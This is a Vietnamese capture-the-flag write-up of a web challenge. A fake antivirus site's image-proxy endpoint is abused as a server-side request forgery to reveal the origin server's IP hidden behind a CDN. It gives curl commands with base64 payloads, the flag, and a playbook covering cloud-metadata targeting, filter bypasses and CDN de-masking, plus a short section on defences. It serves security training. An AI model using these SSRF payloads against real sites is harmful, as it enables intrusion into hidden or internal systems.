# ssrf-origin-ip

- **Category:** Web (SSRF)
- **File đề:** Đề online, không có file kèm. Mục tiêu: một site giả mạo nhà cung cấp phần mềm diệt virus, host tại `https://<av-vendor>.<REDACTED>/`. *(Chú thích: hostname gốc chứa tên giải — đã (REDACTED) theo quy tắc trung tính; dùng placeholder `<av-vendor>.<REDACTED>` thay cho tên thật.)*

## Tóm tắt đề
Một người dùng báo cáo có site giả mạo hãng diệt virus. Nghi ngờ site nấp sau **CDN / reverse proxy** để che giấu máy chủ gốc. Nhiệm vụ: tìm ra **origin server** nằm sau CDN, rồi truy cập trực tiếp để lấy flag.

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
Khi site nấp sau CDN, IP công khai mà ta thấy là của CDN, không phải origin thật. Muốn lộ origin, phải tìm một "kênh" khiến **chính origin tự đi kết nối ra ngoài**, rồi quan sát IP nguồn của kết nối đó.

Đọc source HTML trang chủ, phát hiện endpoint **`/imgcdn.php`** với tham số **`pic` là một chuỗi Base64**. Giải Base64 ra thì được **URL của một tấm ảnh**. Điểm mấu chốt: `imgcdn.php` chạy **trên origin server**; nó nhận URL (dạng Base64), **tự đi fetch nội dung URL đó và trả về**. Đây chính là **SSRF (Server-Side Request Forgery)** — ta ép origin gửi request tới URL do ta chọn.

Nếu ép origin truy cập một dịch vụ "show my IP" (ví dụ `ipinfo.io/json`), thì response sẽ chứa **IP công khai thật của origin** (vì request đi ra từ chính origin), qua đó lộ máy chủ gốc đằng sau CDN.

Khóa thật / dữ liệu kiểm chứng:
- Payload PoC (ép fetch Google để xác nhận fetch URL bất kỳ):
  `https://google.com/` → base64 `aHR0cHM6Ly9nb29nbGUuY29tLw==`
  → response ~23492 byte chính là HTML trang chủ Google (bị hiển thị "méo" vì server coi như ảnh).
- Payload lộ IP origin:
  `https://ipinfo.io/json` → base64 `aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==`
  → JSON trả về chứa IP công khai thật của origin.
- Sau khi vào origin trực tiếp, nó hỏi Basic-Auth. Gợi ý đăng nhập: username `challenger`, password = **chính hostname của site** (`<av-vendor>.<REDACTED>`).

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **SSRF qua tham số `pic` của `/imgcdn.php`** (tham số là URL base64 mà server tự fetch, không giới hạn chỉ ảnh).
- **Tìm origin sau CDN** bằng cách ép server gọi dịch vụ phản chiếu IP.
- **VÌ SAO nhận ra:** tham số `pic` base64 giải ra là **URL ảnh** → nghi "server fetch URL". Kiểm chứng bằng URL bất kỳ (google.com): server vẫn trả nội dung URL đó → xác nhận nó fetch **mọi** URL, không chỉ ảnh → đúng là SSRF.
- **Công cụ:** CyberChef/`base64` (encode/decode), trình duyệt hoặc `curl`.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Đọc source HTML** → thấy ảnh nạp qua `/imgcdn.php?pic=<base64>`. Giải base64 `pic` ra = URL ảnh gốc.

2. **Kiểm chứng SSRF** bằng URL bất kỳ:
   ```bash
   echo -n 'https://google.com/' | base64        # aHR0cHM6Ly9nb29nbGUuY29tLw==
   curl 'https://<av-vendor>.<REDACTED>/imgcdn.php?pic=aHR0cHM6Ly9nb29nbGUuY29tLw==' -o out.bin
   ```
   `out.bin` ~23492 byte = HTML Google → xác nhận server fetch URL bất kỳ.

3. **Ép origin gọi dịch vụ show-IP:**
   ```bash
   echo -n 'https://ipinfo.io/json' | base64       # aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==
   curl 'https://<av-vendor>.<REDACTED>/imgcdn.php?pic=aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=='
   ```
   JSON trả về chứa **IP công khai thật của origin**.

4. **Truy cập trực tiếp origin** (dùng IP vừa tìm). Nó hỏi username/password; sau vài lần sai, hệ thống đưa gợi ý:
   - username: `challenger`
   - password: `<av-vendor>.<REDACTED>` (chính hostname của site).

5. **Đăng nhập** với credential đó → nhận flag.

## Flag
flag{Claim_Abuse_to_Network_Admin}

*(Nguồn canonical `SOLUTIONS_VN.md` — bài #32; flag đã nêu trong writeup đề.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện SSRF:** tham số nhận **URL/hostname/base64 của URL**, hoặc endpoint kiểu "image proxy / fetch / preview / webhook / import from URL". Gặp base64 trong query → luôn decode xem có phải URL.
- **Kiểm chứng:** thay bằng URL bạn kiểm soát/biết trước (google.com, hoặc một listener của bạn). Server trả nội dung URL đó / listener nhận hit → SSRF thật.
- **Tìm origin sau CDN:** ép server gọi show-IP service (`ipinfo.io/json`, `ifconfig.me`, `icanhazip.com`) hoặc server riêng để đọc IP nguồn trong log. Hướng bổ trợ khi không có SSRF: DNS history (SecurityTrails/crt.sh tìm subdomain cũ chưa sau CDN), favicon hash (Shodan/Censys), header rò rỉ, SSL cert.
- **Khai thác sâu hơn:** SSRF còn trỏ nội bộ được (`http://169.254.169.254/` metadata cloud, `http://localhost/`, `file://`).
- **Bẫy:** response có thể bị mã hóa/méo (ở đây xử lý như ảnh) — tải raw rồi phân tích; proxy có thể whitelist scheme/host → thử `http` vs `https`, redirect, IP dạng decimal.
- **Checklist:** [ ] tham số có phải URL (giải base64)? [ ] server fetch URL bất kỳ? [ ] gọi show-IP [ ] lấy IP origin [ ] truy cập origin trực tiếp [ ] đọc gợi ý đăng nhập.
- **Phòng thủ:** chỉ cho fetch domain whitelist; chặn IP nội bộ/metadata; firewall origin chỉ nhận traffic từ dải CDN.
